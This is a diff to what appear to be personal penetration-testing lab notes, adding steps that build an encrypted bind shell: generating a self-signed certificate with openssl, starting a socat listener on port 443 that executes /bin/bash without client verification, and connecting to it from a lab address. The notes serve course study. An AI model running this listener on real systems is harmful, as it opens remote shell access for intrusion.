@@ -14,8 +14,12 @@ recipient
 generate the key
 `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
 combine .key and .crt into .pem
-
-
+`cat bind_shell.key bind_shell.crt > bind_shell.pem`
+create listener using .pem and execute shell
+`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
+connect 
+`socat - OPENSSL:192.168.119.249:443,verify=0`
+![[Pasted image 20220218122213.png]]
 3.  Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?
 
 
